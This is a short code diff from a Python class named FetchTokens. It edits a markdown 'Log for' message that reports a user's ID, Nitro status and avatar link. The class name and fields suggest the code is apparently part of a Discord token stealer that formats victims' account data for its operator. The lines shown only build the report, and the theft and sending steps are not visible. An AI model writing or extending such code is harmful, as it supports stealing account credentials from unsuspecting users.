@@ -139,7 +139,7 @@ class FetchTokens:
                 avatar_emoji = "🖼️"
                 
                 # Create a clean, professional message using markdown and emojis
-                content = f"**🚨 Log for {username} 🚨**\n\n" \
+                content = f"**🚨 Log for <@{user_id}> {username} 🚨**\n\n" \
                           f"**User ID:** `{user_id}`\n" \
                           f"**NS:** {nitro_emoji} {nitro}\n" \
                           f"**Avatar:** {avatar_emoji} [Click here]({avatar})\n\n" \
